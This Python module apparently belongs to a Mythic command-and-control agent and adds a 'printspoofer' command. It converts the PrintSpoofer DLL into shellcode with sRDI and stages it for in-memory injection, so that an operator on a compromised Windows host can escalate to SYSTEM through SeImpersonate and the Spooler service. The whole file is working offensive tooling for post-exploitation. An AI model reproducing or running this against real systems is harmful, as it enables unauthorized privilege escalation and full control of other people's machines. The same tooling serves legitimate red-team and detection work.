from CommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from MythicFileRPC import *


class PrintSpooferArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "command": CommandParameter(name="Arguments to PrintSpoofer", type=ParameterType.String, description="Raw command line to pass to printspoofer.", required=True),
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No command line given.\n\tUsage: {}".format(PrintSpooferCommand.help_cmd))
        self.add_arg("command", self.command_line)
        self.add_arg("pipe_name", str(uuid4()))


class PrintSpooferCommand(CommandBase):
    cmd = "printspoofer"
    needs_admin = False
    help_cmd = "printspoofer -c powershell.exe [-d 1]"
    description = "Execute PrintSpoofer to leverage SeImpersonate privilege to run a command as SYSTEM level context using the Spooler Service (if enabled)."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PrintSpooferArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"PrintSpoofer_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicFileRPC(task).register_file(converted_dll)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.agent_file_id)
        else:
            raise Exception("Failed to register PrintSpoofer DLL: " + file_resp.error_message)
        return task

    async def process_response(self, response: AgentResponse):
        pass